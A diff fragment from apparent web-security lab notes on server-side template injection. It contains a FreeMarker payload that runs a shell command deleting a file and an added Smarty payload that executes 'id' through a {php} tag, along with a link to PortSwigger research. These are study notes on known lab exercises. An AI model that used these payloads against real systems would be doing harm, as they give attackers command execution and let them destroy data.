@@ -203,6 +203,11 @@ Lab: Server-side template injection using documentation
 Payload: <#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("rm /home/carlos/morale.txt") }
 
 
+# Sometimes, thirty seconds of documentation perusal is sufficient to gain RCE. For example, exploiting unsandboxed Smarty is as easy as:
+Payload: {php}echo `id`;{/php}
+
+Rasearch Site: https://portswigger.net/research/server-side-template-injection
+
 
 
 
